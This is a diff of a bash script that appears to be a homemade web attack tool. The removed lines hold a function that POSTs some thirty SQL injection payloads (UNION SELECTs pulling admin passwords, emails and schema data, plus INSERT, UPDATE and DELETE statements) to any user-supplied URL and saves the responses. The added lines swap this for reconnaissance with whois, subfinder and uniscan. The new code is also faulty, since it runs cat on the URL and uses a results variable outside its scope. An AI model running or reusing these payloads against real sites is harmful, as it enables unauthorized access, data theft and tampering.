@@ -73,53 +73,38 @@ check_website_status() {
     fi
 }
 
-perform_sql_injection() {
+scan_website() {
     local target_url="$1"
-    local results_dir="$2"
-    local payloads=(
-        "' OR 1=1 --"
-        "' OR '1'='1' --"
-        "' OR '1'='1'/*"
-        "' OR '1'='1'#"
-        "' OR 1=1 UNION SELECT 1,2,3 --"
-        "' OR 1=1 UNION SELECT NULL, NULL, NULL --"
-        "' OR 1=1 UNION SELECT username, password FROM users WHERE username='admin';"
-        "' OR 1=1 UNION SELECT table_name, column_name FROM information_schema.columns --"
-        "' OR 1=1 UNION SELECT email FROM users --"
-        "' OR 1=1 UNION SELECT password FROM users WHERE username='admin';"
-        "' OR 1=1 UNION SELECT contact_name, contact_number FROM contacts --"
-        "SELECT * FROM users WHERE username='admin';"
-        "INSERT INTO users (username, password) VALUES ('newuser', 'newpassword');"
-        "UPDATE users SET password='newpassword' WHERE username='admin';"
-        "DELETE FROM users WHERE username='olduser';"
-        "SELECT * FROM products WHERE name LIKE '%user_input%';"
-        "SELECT * FROM products WHERE name LIKE '%admin%' UNION SELECT username, password FROM users;"
-        "SELECT * FROM users WHERE username='user_input' AND password='password_input';"
-        "SELECT * FROM users WHERE username='admin' AND password=' OR 1=1 -- ';"
-        "SELECT * FROM products WHERE name LIKE '%user_input%';"
-        "SELECT * FROM products WHERE name LIKE '%admin%' AND SLEEP(5);"
-        "-- -"
-        "-- /*"
-        "-- #"
-        "/*!*/"
-        "OR 1=1"
-        "OR 'a'='a'"
-        "OR 'a'='a' --"
-        "OR 'a'='a' /*"
-        "OR 'a'='a' #"
-        "OR 'a'='a' /*!' OR 'a'='a'"
-    )
+    local results_dir="./results"
 
-    local file_count=1
-    for payload in "${payloads[@]}"; do
-        local data="username=admin${payload}&password=password"
-        local response
-        response=$(curl -s -d "$data" -X POST "$target_url")
-        local output_file="$results_dir/${payload%.---}.txt"
-        save_to_file "$output_file" "$response"
-        echo "Saved SQL Injection results to $output_file"
-        ((file_count++))
-    done
+    # Create a results directory
+    mkdir -p "$results_dir"
+
+    # Perform whois lookup without being blocked
+    if whois "$target_url" | grep -q "Server"; then
+        echo "Found server information:"
+        cat "$target_url"
+    else
+        echo "Failed to find server information."
+    fi
+
+    # Perform subdomain enumeration using subfinder
+    local subdomains_file="$results_dir/subdomains.txt"
+    save_to_file "$subdomains_file" "$(subfinder -silent -domain "$target_url")"
+
+    # Find email addresses and admin info using uniscan
+    if uniscan -u "$target_url" | grep -q "Email"; then
+        echo "Found email addresses:"
+        cat "$target_url"
+    fi
+
+    if uniscan -u "$target_url" | grep -q "Admin"; then
+        echo "Found admin information:"
+        cat "$target_url"
+    fi
+
+    # Clear the screen
+    clear_screen
 }
 
 main() {
@@ -129,22 +114,25 @@ main() {
     # Print the animated header
     print_header
     
-    # Clear the screen
-    clear_screen
-    
+    # Provide examples of usage
+    echo "Examples of usage:"
+    echo "- To scan a website, enter the URL and press Enter."
+    echo "- To exit the program, type 'exit' and press Enter."
+
     # Get the target URL from the user
     read -p "Enter the target URL: " target_url
-    
-    # Create a results directory
-    local results_dir="./results"
-    mkdir -p "$results_dir"
-    
+
+    if [ "$target_url" = "exit" ]; then
+        echo "Exiting..."
+        exit 0
+    fi
+
     # Check if the website is accessible
     if check_website_status "$target_url"; then
-        echo "Starting SQL Injection attempts..."
-        perform_sql_injection "$target_url" "$results_dir"
+        echo "Starting scanning and enumeration..."
+        scan_website "$target_url"
         
-        echo "SQL injection complete. Results saved in $results_dir."
+        echo "Scanning and enumeration complete. Results saved in $results_dir."
     else
         echo "The website is not accessible. Exiting..."
     fi
